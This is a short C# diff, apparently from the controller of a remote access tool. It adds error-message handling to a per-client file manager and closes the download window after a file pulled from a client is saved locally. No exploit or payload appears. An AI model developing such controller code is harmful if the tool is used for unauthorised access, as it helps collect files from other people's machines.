@@ -72,6 +72,7 @@ namespace Server.Handle_Packet
                                         }
                                         FM.listView1.Items.Clear();
                                         FM.listView1.Groups.Clear();
+                                        FM.toolStripStatusLabel3.Text = "";
                                         string[] _folder = unpack_msgpack.ForcePathObject("Folder").AsString.Split(new[] { "-=>" }, StringSplitOptions.None);
                                         ListViewGroup groupFolder = new ListViewGroup("Folders");
                                         FM.listView1.Groups.Add(groupFolder);
@@ -143,6 +144,22 @@ namespace Server.Handle_Packet
                             break;
                         }
 
+                    case "error":
+                        {
+                            if (Program.form1.InvokeRequired)
+                            {
+                                Program.form1.BeginInvoke((MethodInvoker)(() =>
+                                {
+                                    FormFileManager FM = (FormFileManager)Application.OpenForms["fileManager:" + client.ID];
+                                    if (FM != null)
+                                    {
+                                        FM.toolStripStatusLabel3.Text = unpack_msgpack.ForcePathObject("Message").AsString;
+                                    }
+                                }));
+                            }
+                            break;
+                        }
+
                 }
             }
             catch { }
@@ -197,6 +214,10 @@ namespace Server.Handle_Packet
                                                 await Task.Delay(500);
                                             }
                                             await unpack_msgpack.ForcePathObject("File").SaveBytesToFile(Path.Combine(Application.StartupPath, "ClientsFolder\\" + SD.Text.Replace("socketDownload:", "") + "\\" + unpack_msgpack.ForcePathObject("Name").AsString));
+                                            if (SD != null)
+                                            {
+                                                SD.Close();
+                                            }
                                         }
                                     }
                                     catch { }
